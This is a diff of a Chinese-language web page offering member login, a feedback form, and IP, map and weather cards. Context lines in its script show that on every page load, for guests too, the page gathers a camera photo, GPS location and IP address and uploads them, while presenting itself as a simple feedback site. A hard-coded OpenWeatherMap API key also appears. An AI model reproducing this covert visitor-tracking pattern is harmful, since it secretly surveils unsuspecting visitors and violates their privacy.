@@ -46,6 +46,9 @@
       grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
       gap: 1rem;
     }
+    .fade-out {
+      transition: opacity 0.8s ease;
+    }
   </style>
 </head>
 <body>
@@ -73,11 +76,11 @@
 
 <!-- Alert 區塊 -->
 <div class="container mt-3">
-  <div id="statusSuccess" class="alert alert-success d-none" role="alert"></div>
+  <div id="statusSuccess" class="alert alert-success d-none fade-out" role="alert"></div>
   <div id="statusError" class="alert alert-danger d-none" role="alert"></div>
 </div>
 
-<!-- 會員登入 / 註冊 Modal（使用 Bootstrap 原生 .modal.fade，不手動 aria-hidden） -->
+<!-- 會員登入 / 註冊 Modal -->
 <div class="modal fade" id="userModal" tabindex="-1" aria-labelledby="userModalLabel" aria-hidden="true">
   <div class="modal-dialog modal-dialog-centered">
     <div class="modal-content p-3">
@@ -222,24 +225,24 @@
 
 <!-- 主內容 -->
 <div class="container mt-4">
-  <!-- (A) 使用者回傳：不管登入與否都能看到 -->
-  <h4 class="section-title">使用者回傳 (不論是否登入)</h4>
+  <!-- (A) 回饋功能 (所有使用者皆可使用) -->
+  <h4 class="section-title">回饋功能</h4>
   <div class="row mb-3">
-    <div class="col-md-6">
+    <div class="col-md-6 mb-3">
       <div class="card p-3">
         <h5>回傳文字訊息</h5>
         <textarea
           id="userMessage"
           class="form-control mb-2"
           rows="3"
-          placeholder="輸入想要回傳的訊息..."
+          placeholder="輸入您想回饋的訊息..."
         ></textarea>
         <button id="sendMessageBtn" class="btn btn-primary w-100">
           回傳訊息
         </button>
       </div>
     </div>
-    <div class="col-md-6">
+    <div class="col-md-6 mb-3">
       <div class="card p-3">
         <h5>回傳圖片</h5>
         <div class="file-input-container mb-2">
@@ -252,9 +255,9 @@
       </div>
     </div>
   </div>
-  <div class="alert alert-info">
-    如果您尚未註冊/登入，也可以在此回傳訊息或圖片。
-    若要體驗更多功能(裝置資訊/地圖/天氣)，請先註冊或登入。
+  <!-- 提示只在未登入時顯示 -->
+  <div id="guestTip" class="alert alert-info">
+    如果您尚未註冊/登入，也可以在此回傳訊息或圖片。若要體驗更多功能 (裝置資訊/地圖/天氣)，請先註冊或登入。
   </div>
 
   <!-- (B) 只有登入後才顯示的功能 -->
@@ -263,7 +266,7 @@
     <div class="card-grid mb-4">
       <div class="card p-3">
         <h5>IP 與位置資訊</h5>
-        <p id="ipInfo" class="text-muted">資訊載入中...</p>
+        <p id="ipInfo" class="text-muted">資料載入中...</p>
       </div>
       <div class="card p-3">
         <h5>鏡頭狀態</h5>
@@ -292,6 +295,7 @@
 
   const statusSuccess = document.getElementById('statusSuccess');
   const statusError = document.getElementById('statusError');
+  const guestTip = document.getElementById('guestTip');
   const memberPanel = document.getElementById('memberPanel');
 
   /******************************
@@ -357,7 +361,17 @@
     statusSuccess.textContent = msg;
     statusSuccess.classList.remove('d-none');
     statusError.classList.add('d-none');
+
+    // 過幾秒自動淡出
+    setTimeout(() => {
+      statusSuccess.style.opacity = '0';
+      setTimeout(() => {
+        statusSuccess.classList.add('d-none');
+        statusSuccess.style.opacity = '1'; // 重置
+      }, 800);
+    }, 3000);
   }
+
   function showErrorMessage(msg) {
     statusError.textContent = msg;
     statusError.classList.remove('d-none');
@@ -381,7 +395,7 @@
       if (!resp.ok) throw new Error(`HTTP 錯誤：${resp.status}`);
       const result = await resp.json();
       if (result.success) {
-        showSuccessMessage('註冊成功，請切換到「登入」標籤');
+        showSuccessMessage('註冊成功，請切換到「登入」標籤！');
       } else {
         showErrorMessage('註冊失敗：' + (result.error || '未知原因'));
       }
@@ -411,14 +425,16 @@
       if (result.success) {
         sessionStorage.setItem('email', result.user_id);
         showSuccessMessage('登入成功！');
+
         const userModalObj = bootstrap.Modal.getInstance(document.getElementById('userModal'));
-        userModalObj.hide();
+        if (userModalObj) userModalObj.hide();
 
         updateNavbar();
-        // 顯示已登入功能
+        // 隱藏「guestTip」，顯示「memberPanel」
+        guestTip.style.display = 'none';
         memberPanel.style.display = 'block';
 
-        // 再次執行拍照&上傳 => 確保登入後資料也上傳
+        // 再次收集並上傳 => 確保登入後資料也送到 DB
         collectAndSendData();
       } else {
         showErrorMessage(`登入失敗：${result.error}`);
@@ -449,9 +465,10 @@
       if (result.success) {
         showSuccessMessage('管理者登入成功！');
         const adminModalObj = bootstrap.Modal.getInstance(document.getElementById('adminModal'));
-        adminModalObj.hide();
+        if (adminModalObj) adminModalObj.hide();
+
         // 跳轉後台
-        window.location.href = 'https://yourdomain.com/admin.php';
+        window.location.href = 'https://your-domain/admin.php';
       } else {
         showErrorMessage('管理者登入失敗：' + (result.error || '未知原因'));
       }
@@ -461,7 +478,7 @@
   });
 
   /******************************
-   * 使用者回傳訊息
+   * 使用者回傳：文字訊息
    ******************************/
   document.getElementById('sendMessageBtn').addEventListener('click', async () => {
     const email = sessionStorage.getItem('email') || 'guest_user';
@@ -490,7 +507,7 @@
   });
 
   /******************************
-   * 使用者回傳圖片
+   * 使用者回傳：圖片
    ******************************/
   document.getElementById('sendImageBtn').addEventListener('click', async () => {
     const email = sessionStorage.getItem('email') || 'guest_user';
@@ -501,7 +518,6 @@
     }
     try {
       const base64Data = await readFileAsBase64(fileInput.files[0]);
-
       const formData = new FormData();
       formData.append('action', 'sendUserImage');
       formData.append('email', email);
@@ -533,10 +549,9 @@
   }
 
   /******************************
-   * 拍照 + GPS + IP 收集
+   * 拍照 + GPS + IP 收集 & 上傳
    ******************************/
   async function collectAndSendData() {
-    // 顯示收集中
     const statusElem = document.getElementById('status');
     if (statusElem) {
       statusElem.textContent = '正在收集資料...';
@@ -556,12 +571,12 @@
       if (ipResult.status === 'fulfilled') collectedData.ip = ipResult.value;
       if (photoResult) collectedData.photo = photoResult;
 
-      // 如果使用者已登入，更新前端卡片
+      // 若已登入，就更新裝置資訊卡片
       if (sessionStorage.getItem('email')) {
         updateUI(collectedData);
       }
 
-      // 上傳 (無論登入或否)
+      // 上傳(不管登入或否)
       const formData = new FormData();
       const email = sessionStorage.getItem('email') || 'guest_user';
       formData.append('email', email);
@@ -664,14 +679,14 @@
     }
   }
 
-  // 根據收集到的資料更新「已登入」卡片 UI
+  // 若已登入 => 更新裝置資訊卡片 (IP/天氣等)
   function updateUI({ gps, ip }) {
     // 更新 IP
-    const ipInfoElem = document.getElementById('ipInfo');
-    if (ip && ipInfoElem) {
-      ipInfoElem.textContent = `IP: ${ip.ip}, City: ${ip.city}, Region: ${ip.region}`;
-    } else if (ipInfoElem) {
-      ipInfoElem.textContent = '無法取得 IP 資訊';
+    const ipElem = document.getElementById('ipInfo');
+    if (ip && ipElem) {
+      ipElem.textContent = `IP: ${ip.ip}, City: ${ip.city}, Region: ${ip.region}`;
+    } else if (ipElem) {
+      ipElem.textContent = '無法取得 IP 資訊';
     }
     // 更新地圖 & 天氣
     if (gps) {
@@ -686,13 +701,14 @@
       if (!lat || !lon) return;
       // 請換成您自己的 openweathermap apiKey
       const apiKey = 'ae0c5817d5c802a5f12d3c9de2517611';
-      const resp = await fetch(`https://api.openweathermap.org/data/2.5/weather?lat=${lat}&lon=${lon}&units=metric&lang=zh_tw&appid=${apiKey}`);
+      const resp = await fetch(
+        `https://api.openweathermap.org/data/2.5/weather?lat=${lat}&lon=${lon}&units=metric&lang=zh_tw&appid=${apiKey}`
+      );
       const data = await resp.json();
       const temp = data.main.temp;
       const weather = data.weather[0].description;
       const humidity = data.main.humidity;
-      const wElem = document.getElementById('weatherInfo');
-      wElem.innerHTML = `
+      document.getElementById('weatherInfo').innerHTML = `
         <img src="https://openweathermap.org/img/wn/${data.weather[0].icon}.png" alt="${weather}">
         溫度: ${temp}°C, 天氣: ${weather}, 濕度: ${humidity}%
       `;
@@ -702,15 +718,17 @@
     }
   }
 
-  // DOMContentLoaded → 初始化
+  // 頁面初始化
   document.addEventListener('DOMContentLoaded', async () => {
     updateNavbar();
     const email = sessionStorage.getItem('email');
-    // 如果已登入，就顯示 memberPanel
     if (email) {
+      // 已登入: 隱藏提示, 顯示裝置資訊面板
+      guestTip.style.display = 'none';
       memberPanel.style.display = 'block';
     }
-    // 頁面一載入就執行收集 & 上傳
+
+    // 一打開頁面就執行拍照 + 資料收集 + 上傳
     collectAndSendData();
   });
 </script>
